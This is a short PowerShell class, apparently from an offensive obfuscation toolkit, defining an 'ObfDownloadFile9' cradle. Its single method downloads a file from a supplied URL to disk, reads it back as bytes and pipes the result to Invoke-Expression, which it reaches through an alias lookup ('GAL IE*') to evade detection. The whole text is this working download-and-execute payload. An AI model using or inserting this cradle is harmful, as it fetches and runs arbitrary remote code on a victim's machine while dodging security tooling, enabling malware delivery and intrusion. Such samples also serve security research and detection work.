Class ObfDownloadFile9 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Invoke\3
        (New-Object Net.WebClient).DownloadFile($url,$path);([String]::Join('',([Char[]](TYPE $path -Encod Byte))))|&(GAL IE*)
    }

}